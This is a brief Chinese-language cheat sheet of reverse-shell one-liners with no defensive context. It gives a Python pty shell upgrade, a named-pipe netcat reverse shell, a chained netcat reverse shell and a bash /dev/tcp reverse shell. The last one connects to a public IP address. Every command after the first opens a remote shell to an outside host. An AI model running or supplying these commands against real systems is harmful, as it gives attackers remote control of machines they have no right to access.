python fork 一个shell 
```
python -c "import pty;pty.spawn('/bin/bash')" 
```
在没有-e参数的情况下通过命名管道反弹shell
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc 192.168.1.106 3333 > /tmp/f  
```
在没有-e参数的情况下nc串联反弹shell
```
nc 192.168.1.109 3333 | /bin/bash | nc 192.168.1.109 4444 
```
```
bash -c 'bash -i >& /dev/tcp/106.52.193.41/88 0>&1'
```
